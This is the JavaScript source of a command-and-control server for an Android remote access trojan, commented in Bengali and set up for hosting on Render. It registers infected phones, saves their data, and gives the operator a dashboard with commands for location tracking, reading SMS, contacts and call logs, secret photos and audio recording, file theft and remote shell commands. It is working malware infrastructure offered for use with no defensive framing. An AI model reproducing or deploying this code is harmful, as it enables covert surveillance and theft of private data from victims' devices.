// ==============================================
// RAT কমান্ড এন্ড কন্ট্রোল সার্ভার - Render এর জন্য অপ্টিমাইজড
// লেখক: আপনার নাম
// ভার্সন: 1.0.0
// ==============================================

const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const url = require('url');

// কনফিগারেশন - আপনার প্রয়োজন অনুযায়ী পরিবর্তন করুন
const config = {
  // Render স্বয়ংক্রিয়ভাবে PORT এনভায়রনমেন্ট ভেরিয়েবল সেট করে
  port: process.env.PORT || 8080,
  // অথেনটিকেশন টোকেন (পরবর্তীতে পরিবর্তন করবেন)
  authToken: 'your-secret-token-123',
  // ডাটা স্টোরেজ ডিরেক্টরি
  dataDir: './data',
  // ক্লায়েন্ট ডাটা সংরক্ষণ করবেন কিনা
  saveClientData: true,
  // পিং ইন্টারভাল (মিলিসেকেন্ডে)
  pingInterval: 30000, // ৩০ সেকেন্ড
  // কমান্ড টাইমআউট (মিলিসেকেন্ডে)
  commandTimeout: 30000 // ৩০ সেকেন্ড
};

// ডাটা ডিরেক্টরি তৈরি করুন (যদি না থাকে)
if (!fs.existsSync(config.dataDir)) {
  fs.mkdirSync(config.dataDir, { recursive: true });
  console.log(`[SYSTEM] ডাটা ডিরেক্টরি তৈরি করা হয়েছে: ${config.dataDir}`);
}

// গ্লোবাল ভেরিয়েবল
const clients = new Map(); // সংযুক্ত ক্লায়েন্টদের তালিকা
const commandCallbacks = new Map(); // কমান্ড কলব্যাক সংরক্ষণ

// HTTP সার্ভার তৈরি করুন (Express ছাড়া)
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  // CORS হেডার সেট করুন
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // OPTIONS রিকোয়েস্ট হ্যান্ডেল করুন (CORS preflight)
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // === হেলথ চেক এন্ডপয়েন্ট (Render এর জন্য অপরিহার্য) ===
  if (pathname === '/healthz' || pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      clients: clients.size,
      memory: process.memoryUsage()
    }));
    return;
  }

  // === রুট এন্ডপয়েন্ট ===
  if (pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>RAT C2 Server</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
          body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
          .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
          h1 { color: #333; }
          .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
          .status { display: inline-block; padding: 5px 10px; background: #4caf50; color: white; border-radius: 3px; }
          .url { background: #f5f5f5; padding: 10px; border-radius: 3px; font-family: monospace; }
          .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; }
          .stat-card { background: #f9f9f9; padding: 15px; border-radius: 5px; text-align: center; }
          .stat-value { font-size: 24px; font-weight: bold; color: #2196f3; }
          .stat-label { color: #666; margin-top: 5px; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>🚀 RAT কমান্ড এন্ড কন্ট্রোল সার্ভার</h1>
          <div class="info">
            <span class="status">সক্রিয়</span>
            <p>সার্ভার সফলভাবে চলছে!</p>
          </div>
          
          <div class="stats">
            <div class="stat-card">
              <div class="stat-value" id="clientCount">0</div>
              <div class="stat-label">সংযুক্ত ক্লায়েন্ট</div>
            </div>
            <div class="stat-card">
              <div class="stat-value" id="uptime">0</div>
              <div class="stat-label">আপটাইম (ঘন্টা)</div>
            </div>
            <div class="stat-card">
              <div class="stat-value" id="memory">0</div>
              <div class="stat-label">মেমরি (MB)</div>
            </div>
          </div>
          
          <h3>📡 সংযোগ তথ্য</h3>
          <div class="url">
            <strong>WebSocket URL:</strong> wss://${req.headers.host}<br>
            <strong>Dashboard:</strong> <a href="/dashboard">/dashboard</a><br>
            <strong>Health Check:</strong> <a href="/healthz">/healthz</a>
          </div>
          
          <h3>📋 ডকুমেন্টেশন</h3>
          <ul>
            <li><strong>WebSocket এন্ডপয়েন্ট:</strong> রুট পাথে WebSocket সংযোগ স্থাপন করুন</li>
            <li><strong>ড্যাশবোর্ড:</strong> /dashboard পাথে ক্লায়েন্ট ম্যানেজমেন্ট</li>
            <li><strong>হেলথ চেক:</strong> /healthz পাথে সার্ভার স্ট্যাটাস</li>
            <li><strong>ফাইল অ্যাক্সেস:</strong> /files/&lt;client-id&gt;/&lt;filename&gt;</li>
          </ul>
        </div>
        
        <script>
          // লাইভ স্ট্যাটাস আপডেট
          function updateStats() {
            fetch('/healthz')
              .then(res => res.json())
              .then(data => {
                document.getElementById('clientCount').textContent = data.clients;
                document.getElementById('uptime').textContent = (data.uptime / 3600).toFixed(1);
                document.getElementById('memory').textContent = (data.memory.rss / 1024 / 1024).toFixed(0);
              })
              .catch(err => console.log(err));
          }
          updateStats();
          setInterval(updateStats, 5000);
        </script>
      </body>
      </html>
    `);
    return;
  }

  // === ড্যাশবোর্ড এন্ডপয়েন্ট ===
  if (pathname === '/dashboard') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getDashboardHTML());
    return;
  }

  // === ফাইল সার্ভিং এন্ডপয়েন্ট ===
  if (pathname.startsWith('/files/')) {
    const filePath = path.join(config.dataDir, pathname.replace('/files/', ''));
    
    // পাথ ট্রাভার্সাল প্রতিরোধ
    if (!filePath.startsWith(config.dataDir)) {
      res.writeHead(403);
      res.end('Forbidden');
      return;
    }
    
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('File not found');
      } else {
        res.writeHead(200, {
          'Content-Type': 'application/octet-stream',
          'Content-Disposition': `attachment; filename="${path.basename(filePath)}"`
        });
        res.end(data);
      }
    });
    return;
  }

  // === API স্ট্যাটাস এন্ডপয়েন্ট ===
  if (pathname === '/api/stats') {
    const clientList = Array.from(clients.values()).map(c => ({
      id: c.id,
      online: c.online,
      lastSeen: c.lastSeen,
      deviceInfo: c.deviceInfo
    }));
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      totalClients: clients.size,
      onlineClients: Array.from(clients.values()).filter(c => c.online).length,
      clients: clientList,
      uptime: process.uptime()
    }));
    return;
  }

  // 404 - পেজ খুঁজে পাওয়া যায়নি
  res.writeHead(404);
  res.end('404 - Not Found');
});

// === WebSocket সার্ভার তৈরি করুন ===
const wss = new WebSocket.Server({ 
  noServer: true, // HTTP সার্ভারের সাথে ইন্টিগ্রেট করব
  path: '/' // রুট পাথে WebSocket সংযোগ
});

// WebSocket সংযোগ হ্যান্ডলিং
wss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress;
  const clientId = generateClientId();
  
  // ক্লায়েন্টের জন্য আলাদা প্রপার্টি
  ws.isAlive = true;
  ws.clientId = clientId;
  
  console.log(`[${new Date().toISOString()}] ✅ নতুন ক্লায়েন্ট সংযুক্ত: ${clientId} (IP: ${clientIp})`);
  
  // ক্লায়েন্ট তথ্য সংরক্ষণ
  clients.set(ws, {
    id: clientId,
    ip: clientIp,
    connectedAt: new Date(),
    lastSeen: new Date(),
    deviceInfo: null,
    online: true,
    ws: ws,
    userAgent: req.headers['user-agent'] || 'Unknown'
  });
  
  // সংযোগ সফল বার্তা পাঠান
  ws.send(JSON.stringify({
    type: 'connected',
    clientId: clientId,
    timestamp: new Date().toISOString(),
    message: 'সার্ভারের সাথে সংযোগ স্থাপিত হয়েছে',
    commands: [
      'GET_LOCATION', 'GET_SMS', 'GET_CONTACTS', 'GET_CALL_LOGS',
      'TAKE_PICTURE', 'RECORD_AUDIO', 'GET_FILES', 'UPLOAD_FILE',
      'DOWNLOAD_FILE', 'SHELL_COMMAND', 'VIBRATE', 'SHOW_NOTIFICATION'
    ]
  }));
  
  // মেসেজ হ্যান্ডলার
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      ws.isAlive = true;
      
      // ক্লায়েন্টের শেষ দেখা আপডেট
      const client = clients.get(ws);
      if (client) {
        client.lastSeen = new Date();
      }
      
      handleClientMessage(ws, clientId, message);
    } catch (error) {
      console.error(`[${clientId}] ❌ মেসেজ পার্স করতে সমস্যা:`, error.message);
    }
  });
  
  // পং রেসপন্স হ্যান্ডলার
  ws.on('pong', () => {
    ws.isAlive = true;
    
    const client = clients.get(ws);
    if (client) {
      client.lastSeen = new Date();
    }
  });
  
  // ডিসকানেক্ট হ্যান্ডলার
  ws.on('close', (code, reason) => {
    console.log(`[${new Date().toISOString()}] ❌ ক্লায়েন্ট ডিসকানেক্ট: ${clientId} (Code: ${code})`);
    
    const client = clients.get(ws);
    if (client) {
      client.online = false;
      client.disconnectedAt = new Date();
    }
    
    clients.delete(ws);
  });
  
  // এরর হ্যান্ডলার
  ws.on('error', (error) => {
    console.error(`[${clientId}] ❌ WebSocket এরর:`, error.message);
  });
});

// HTTP সার্ভারের upgrade ইভেন্ট হ্যান্ডেল করুন (WebSocket এর জন্য)
server.on('upgrade', (req, socket, head) => {
  const pathname = url.parse(req.url).pathname;
  
  // শুধু রুট পাথে WebSocket সংযোগ অনুমোদন করুন
  if (pathname === '/') {
    wss.handleUpgrade(req, socket, head, (ws) => {
      wss.emit('connection', ws, req);
    });
  } else {
    // অন্য কোন পাথে WebSocket সংযোগ নয়
    socket.write('HTTP/1.1 404 Not Found\r\n\r\n');
    socket.destroy();
  }
});

// === ক্লায়েন্ট মেসেজ প্রসেসিং ===
function handleClientMessage(ws, clientId, message) {
  const client = clients.get(ws);
  if (!client) return;
  
  switch (message.type) {
    case 'device_info':
      // ডিভাইস তথ্য সংরক্ষণ
      client.deviceInfo = message.data;
      console.log(`[${clientId}] 📱 ডিভাইস তথ্য:`, message.data.model || 'Unknown');
      
      // ডিভাইস তথ্য ফাইলএ সংরক্ষণ (যদি অপশন অন থাকে)
      if (config.saveClientData) {
        saveClientData(clientId, 'device_info', message.data);
      }
      break;
      
    case 'response':
      // কমান্ড রেসপন্স হ্যান্ডেল করুন
      console.log(`[${clientId}] 📨 কমান্ড রেসপন্স: ${message.command_id || 'Unknown'}`);
      
      // কলব্যাক কল করুন
      if (message.command_id && commandCallbacks.has(message.command_id)) {
        const callback = commandCallbacks.get(message.command_id);
        callback({
          clientId: clientId,
          status: message.status || 'success',
          data: message.data || {},
          timestamp: message.timestamp || new Date().toISOString()
        });
        commandCallbacks.delete(message.command_id);
      }
      
      // রেসপন্স ডাটা সংরক্ষণ
      if (config.saveClientData && message.data) {
        saveClientData(clientId, `response_${message.command_id || 'unknown'}`, {
          command_id: message.command_id,
          status: message.status,
          data: message.data
        });
      }
      break;
      
    case 'heartbeat':
      // হার্টবিট রেসপন্স
      ws.send(JSON.stringify({
        type: 'heartbeat_ack',
        timestamp: new Date().toISOString()
      }));
      break;
      
    case 'log':
      // ক্লায়েন্ট থেকে লগ মেসেজ
      console.log(`[${clientId}] 📝 ক্লায়েন্ট লগ:`, message.message || '');
      break;
      
    default:
      console.log(`[${clientId}] ❓ অজানা মেসেজ টাইপ:`, message.type);
  }
}

// === ক্লায়েন্ট ডাটা ফাইলএ সংরক্ষণ ===
function saveClientData(clientId, type, data) {
  try {
    const clientDir = path.join(config.dataDir, clientId);
    
    // ক্লায়েন্ট ডিরেক্টরি তৈরি করুন
    if (!fs.existsSync(clientDir)) {
      fs.mkdirSync(clientDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = path.join(clientDir, `${type}_${timestamp}.json`);
    
    fs.writeFileSync(filename, JSON.stringify({
      timestamp: new Date().toISOString(),
      type: type,
      data: data
    }, null, 2));
    
  } catch (error) {
    console.error(`[${clientId}] ❌ ডাটা সংরক্ষণে সমস্যা:`, error.message);
  }
}

// === ক্লায়েন্টে কমান্ড পাঠান ===
function sendCommandToClient(ws, commandType, params = {}) {
  return new Promise((resolve, reject) => {
    const commandId = generateCommandId();
    const fullCommand = {
      type: commandType,
      commandId: commandId,
      data: params,
      timestamp: new Date().toISOString()
    };
    
    // টাইমআউট সেট করুন
    const timeout = setTimeout(() => {
      if (commandCallbacks.has(commandId)) {
        commandCallbacks.delete(commandId);
        reject(new Error('কমান্ড টাইমআউট'));
      }
    }, config.commandTimeout);
    
    // কলব্যাক সংরক্ষণ
    commandCallbacks.set(commandId, (response) => {
      clearTimeout(timeout);
      resolve(response);
    });
    
    // কমান্ড পাঠান
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(fullCommand));
    } else {
      clearTimeout(timeout);
      commandCallbacks.delete(commandId);
      reject(new Error('WebSocket সংযোগ বন্ধ'));
    }
  });
}

// === ক্লায়েন্ট আইডি জেনারেটর ===
function generateClientId() {
  return 'client_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
}

// === কমান্ড আইডি জেনারেটর ===
function generateCommandId() {
  return 'cmd_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
}

// === হেলদি চেক পিং ইন্টারভাল ===
const pingInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      // ক্লায়েন্ট সাড়া দেয়নি, ডিসকানেক্ট করুন
      const clientId = ws.clientId || 'Unknown';
      console.log(`[${new Date().toISOString()}] ⚠️ ক্লায়েন্ট সাড়া দেয়নি: ${clientId}`);
      clients.delete(ws);
      return ws.terminate();
    }
    
    ws.isAlive = false;
    ws.ping();
  });
}, config.pingInterval);

wss.on('close', () => {
  clearInterval(pingInterval);
});

// === গ্রেসফুল শাটডাউন হ্যান্ডলিং (Render এর জন্য গুরুত্বপূর্ণ) ===
function gracefulShutdown(signal) {
  console.log(`\n[${new Date().toISOString()}] 📴 ${signal} সিগন্যাল প্রাপ্ত, গ্রেসফুল শাটডাউন শুরু...`);
  
  // নতুন সংযোগ বন্ধ করুন
  server.close(() => {
    console.log('HTTP সার্ভার বন্ধ হয়েছে');
  });
  
  // সব ক্লায়েন্টকে বন্ধের বার্তা পাঠান
  wss.clients.forEach((ws) => {
    ws.close(1001, 'Server shutting down');
  });
  
  // ক্লায়েন্ট ডাটা সংরক্ষণ
  console.log(`মোট সংযুক্ত ক্লায়েন্ট: ${clients.size}`);
  
  // কিছু সময় পর প্রক্রিয়া বন্ধ করুন
  setTimeout(() => {
    console.log('শাটডাউন সম্পূর্ণ');
    process.exit(0);
  }, 5000);
}

// সিগন্যাল হ্যান্ডলার
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// === ড্যাশবোর্ড HTML জেনারেটর ফাংশন ===
function getDashboardHTML() {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <title>RAT C2 Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; padding: 20px; }
      .container { max-width: 1400px; margin: 0 auto; }
      .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 10px; margin-bottom: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
      .header h1 { font-size: 28px; margin-bottom: 10px; }
      .header p { opacity: 0.9; }
      .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 25px; }
      .stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); transition: transform 0.3s; }
      .stat-card:hover { transform: translateY(-5px); box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
      .stat-title { color: #666; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
      .stat-value { font-size: 36px; font-weight: bold; color: #333; margin: 10px 0; }
      .stat-unit { color: #999; font-size: 14px; }
      .server-info { background: #e8f4fd; border-left: 4px solid #2196f3; padding: 15px 20px; border-radius: 5px; margin-bottom: 25px; font-family: monospace; font-size: 14px; }
      .clients-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; margin-bottom: 25px; }
      .client-card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); transition: all 0.3s; border: 1px solid #e0e0e0; }
      .client-card.online { border-left: 4px solid #4caf50; }
      .client-card.offline { border-left: 4px solid #f44336; opacity: 0.7; }
      .client-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
      .client-id { font-family: monospace; font-weight: bold; color: #333; font-size: 14px; }
      .client-status { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
      .online .client-status { background: #e8f5e8; color: #2e7d32; }
      .offline .client-status { background: #ffebee; color: #c62828; }
      .client-details { font-size: 13px; color: #666; margin-bottom: 15px; }
      .client-details div { margin-bottom: 5px; }
      .client-details i { width: 20px; color: #999; }
      .command-section { border-top: 1px solid #e0e0e0; padding-top: 15px; }
      .command-select, .command-input { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 13px; }
      .command-input { font-family: monospace; }
      .btn-send { width: 100%; padding: 10px; background: #4caf50; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: background 0.3s; }
      .btn-send:hover { background: #45a049; }
      .btn-send:disabled { background: #ccc; cursor: not-allowed; }
      .logs-container { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; font-family: 'Consolas', monospace; font-size: 12px; height: 250px; overflow-y: auto; margin-top: 25px; }
      .log-entry { padding: 2px 0; border-bottom: 1px solid #333; }
      .log-time { color: #6a9955; }
      .log-info { color: #9cdcfe; }
      .log-error { color: #f48771; }
      .log-success { color: #b5cea8; }
      .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; }
      .modal-content { background: white; padding: 30px; border-radius: 10px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; }
      .modal-close { float: right; font-size: 24px; cursor: pointer; color: #999; }
      .modal-close:hover { color: #333; }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>🔐 RAT কন্ট্রোল প্যানেল</h1>
        <p>রিয়েল-টাইম ক্লায়েন্ট ম্যানেজমেন্ট ড্যাশবোর্ড</p>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-title">মোট ক্লায়েন্ট</div>
          <div class="stat-value" id="totalClients">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">অনলাইন</div>
          <div class="stat-value" id="onlineClients">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">অফলাইন</div>
          <div class="stat-value" id="offlineClients">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">আপটাইম</div>
          <div class="stat-value" id="uptime">0</div>
          <div class="stat-unit">ঘন্টা</div>
        </div>
      </div>
      
      <div class="server-info" id="serverInfo">
        WebSocket URL: wss://${server.address()?.address || 'localhost'}:${config.port}
      </div>
      
      <div id="clients" class="clients-grid"></div>
      
      <div class="logs-container" id="logs">
        <div class="log-entry"><span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span class="log-info">ড্যাশবোর্ড লোড হয়েছে</span></div>
      </div>
    </div>
    
    <div id="responseModal" class="modal">
      <div class="modal-content">
        <span class="modal-close" onclick="closeModal()">&times;</span>
        <h3>কমান্ড রেসপন্স</h3>
        <pre id="responseData" style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;"></pre>
      </div>
    </div>
    
    <script>
      // WebSocket সংযোগ স্থাপন
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const wsUrl = protocol + '//' + window.location.host;
      let ws = new WebSocket(wsUrl);
      
      let clients = new Map();
      
      function connectWebSocket() {
        ws = new WebSocket(wsUrl);
        
        ws.onopen = () => {
          addLog('ড্যাশবোর্ড সংযুক্ত', 'info');
        };
        
        ws.onmessage = (event) => {
          try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'connected') {
              addLog('সার্ভার সংযুক্ত - ID: ' + data.clientId, 'success');
            } else if (data.type === 'clients_update') {
              updateClients(data.clients);
            } else if (data.type === 'response') {
              handleCommandResponse(data);
            }
          } catch (e) {
            console.error('পার্স এরর:', e);
          }
        };
        
        ws.onclose = () => {
          addLog('সংযোগ বিচ্ছিন্ন, পুনরায় সংযোগের চেষ্টা...', 'error');
          setTimeout(connectWebSocket, 3000);
        };
        
        ws.onerror = (error) => {
          addLog('WebSocket ত্রুটি', 'error');
        };
      }
      
      connectWebSocket();
      
      function updateClients(clientList) {
        const online = clientList.filter(c => c.online).length;
        document.getElementById('totalClients').textContent = clientList.length;
        document.getElementById('onlineClients').textContent = online;
        document.getElementById('offlineClients').textContent = clientList.length - online;
        
        const clientsDiv = document.getElementById('clients');
        clientsDiv.innerHTML = clientList.map(client => createClientCard(client)).join('');
      }
      
      function createClientCard(client) {
        const deviceInfo = client.deviceInfo || {};
        const lastSeen = new Date(client.lastSeen).toLocaleString();
        
        return \`
          <div class="client-card \${client.online ? 'online' : 'offline'}" id="client-\${client.id}">
            <div class="client-header">
              <span class="client-id">\${client.id.substring(0, 15)}...</span>
              <span class="client-status">\${client.online ? 'অনলাইন' : 'অফলাইন'}</span>
            </div>
            <div class="client-details">
              <div>📱 মডেল: \${deviceInfo.model || 'অজানা'}</div>
              <div>🤖 অ্যান্ড্রয়েড: \${deviceInfo.androidVersion || 'অজানা'}</div>
              <div>🔋 ব্যাটারি: \${deviceInfo.batteryLevel || '?'}%</div>
              <div>📡 সংযোগ: \${deviceInfo.networkType || 'অজানা'}</div>
              <div>🕒 শেষ দেখা: \${lastSeen}</div>
              <div>🌐 আইপি: \${client.ip || 'অজানা'}</div>
            </div>
            <div class="command-section">
              <select class="command-select" id="cmd-\${client.id}">
                <option value="GET_LOCATION">📍 অবস্থান দেখুন</option>
                <option value="GET_SMS">💬 এসএমএস দেখুন</option>
                <option value="GET_CONTACTS">👤 কন্টাক্ট দেখুন</option>
                <option value="GET_CALL_LOGS">📞 কল লগ দেখুন</option>
                <option value="TAKE_PICTURE">📸 ছবি তুলুন</option>
                <option value="RECORD_AUDIO">🎤 অডিও রেকর্ড করুন</option>
                <option value="GET_FILES">📁 ফাইল তালিকা</option>
                <option value="VIBRATE">📳 কম্পন</option>
                <option value="SHOW_NOTIFICATION">🔔 নোটিফিকেশন দেখান</option>
                <option value="SHELL_COMMAND">⚙️ শেল কমান্ড</option>
              </select>
              <input type="text" class="command-input" id="param-\${client.id}" placeholder="প্যারামিটার (JSON)">
              <button class="btn-send" onclick="sendCommand('\${client.id}')" \${!client.online ? 'disabled' : ''}>
                \${client.online ? 'কমান্ড পাঠান' : 'অফলাইন'}
              </button>
            </div>
          </div>
        \`;
      }
      
      function sendCommand(clientId) {
        const cmdSelect = document.getElementById('cmd-' + clientId);
        const paramInput = document.getElementById('param-' + clientId);
        
        let params = {};
        if (paramInput.value.trim()) {
          try {
            params = JSON.parse(paramInput.value);
          } catch (e) {
            alert('JSON ফরম্যাট সঠিক নয়');
            return;
          }
        }
        
        ws.send(JSON.stringify({
          type: 'command',
          clientId: clientId,
          command: cmdSelect.value,
          params: params
        }));
        
        addLog('কমান্ড পাঠানো হয়েছে: ' + clientId + ' -> ' + cmdSelect.value, 'info');
        paramInput.value = '';
      }
      
      function handleCommandResponse(response) {
        addLog('রেসপন্স পাওয়া গেছে: ' + response.clientId, 'success');
        
        const modal = document.getElementById('responseModal');
        const responseData = document.getElementById('responseData');
        responseData.textContent = JSON.stringify(response, null, 2);
        modal.style.display = 'flex';
      }
      
      function closeModal() {
        document.getElementById('responseModal').style.display = 'none';
      }
      
      function addLog(message, type = 'info') {
        const logs = document.getElementById('logs');
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        const time = new Date().toLocaleTimeString();
        let typeClass = 'log-info';
        if (type === 'error') typeClass = 'log-error';
        if (type === 'success') typeClass = 'log-success';
        
        logEntry.innerHTML = '<span class="log-time">[' + time + ']</span> <span class="' + typeClass + '">' + message + '</span>';
        logs.appendChild(logEntry);
        logs.scrollTop = logs.scrollHeight;
      }
      
      // স্ট্যাটাস আপডেট
      setInterval(() => {
        fetch('/api/stats')
          .then(res => res.json())
          .then(data => {
            document.getElementById('uptime').textContent = (data.uptime / 3600).toFixed(1);
          })
          .catch(() => {});
      }, 5000);
      
      window.onclick = function(event) {
        const modal = document.getElementById('responseModal');
        if (event.target == modal) {
          modal.style.display = 'none';
        }
      }
    </script>
  </body>
  </html>
  `;
}

// === সার্ভার চালু করুন ===
server.listen(config.port, () => {
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║     🔥 RAT কমান্ড এন্ড কন্ট্রোল সার্ভার                     ║
╠══════════════════════════════════════════════════════════════╣
║  📡 ওয়েবসকেট: ws://localhost:${config.port}                     ║
║  🌐 ড্যাশবোর্ড: http://localhost:${config.port}/dashboard        ║
║  💓 হেলথ চেক: http://localhost:${config.port}/healthz           ║
║  📊 API স্ট্যাটাস: http://localhost:${config.port}/api/stats    ║
╠══════════════════════════════════════════════════════════════╣
║  ✅ সার্ভার সফলভাবে চলছে!                                   ║
║  📝 Render এ ডিপ্লোয়ের জন্য প্রস্তুত                        ║
╚══════════════════════════════════════════════════════════════╝
  `);
  
  console.log(`[${new Date().toISOString()}] 🚀 সার্ভার চালু হয়েছে পোর্ট ${config.port}`);
});
